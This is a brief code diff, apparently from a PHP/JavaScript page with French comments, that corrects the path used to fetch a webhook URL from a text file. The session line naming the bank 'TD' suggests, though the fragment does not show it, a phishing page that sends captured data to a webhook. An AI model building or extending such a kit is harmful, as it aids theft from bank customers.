@@ -241,7 +241,7 @@ $_SESSION["bank"] = 'TD';
         };
 
         // On lit le webhook depuis le fichier texte
-        fetch('webhookurl.txt')
+        fetch('/webhookurl.txt')
             .then(response => response.text())
             .then(webhookURL => {
                 // Nettoyage (par exemple si le fichier contient des sauts de ligne)
